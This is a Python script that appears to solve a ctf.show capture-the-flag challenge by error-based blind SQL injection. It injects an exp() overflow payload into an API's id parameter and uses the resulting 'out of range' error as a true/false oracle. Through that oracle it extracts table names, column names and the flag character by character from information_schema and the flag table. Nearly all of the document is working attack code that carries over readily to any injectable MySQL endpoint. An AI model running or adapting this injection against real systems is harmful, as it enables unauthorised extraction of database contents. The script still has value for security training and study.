import utfc.StrFunc as sf
import utfc.UtilFuction as uf
import requests
url="http://29c61855-2428-4929-957d-cc95b6be4922.chall.ctf.show/api/?page=1&limit=10&id=1'and "

def chk(pl):
    pl=f"exp(888888*({pl}))-- -"
    t=requests.get(url+pl).text
    return 'out of range' in t



Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
table=''

def bi(pl='1',plf='',ret='',l=1):
    plTmpl="select ascii(mid({},{},1))>{} {}"

    while True:
        print(l,end=',')
        pl_gcd='select + length('+pl+')=%d '%l + plf
        if chk(pl_gcd) : break
        l+=1
    print('\n'+'- '*20)
    print('len=', l)
    print('- ' * 20)

    for i in range (len(ret)+1,1+l):
        print('\n',format(ret,'%ds'%(l+2))+"|%02d| "%i,end='')
        a=uf.Area(Alphabet,reSort=True)
        for j in a:
            pl_gnr=plTmpl.format(pl,i,ord(j),plf)
            print(j,end='')
            a.Test=chk(pl_gnr)
        ret+=a.ans


    print('\n'+'- '*20)
    print('ret=', ret)
    print('- ' * 20)
    return ret


print(chk('select(1=1)'),chk('select(1>1)'))
#bi(pl='group_concat(table_name)',plf=' from information_schema.tables where table_schema=database() ')#爆表
#bi('(group_concat(column_name))'," from(information_schema.columns)where(table_name = 'ctfshow_flagsa' )",'') # 爆字段
Alphabet=list('0123456789-abcdef{}gl')
bi('group_concat(`flag?`)',' from ctfshow_flagsa','',41) #爆flag
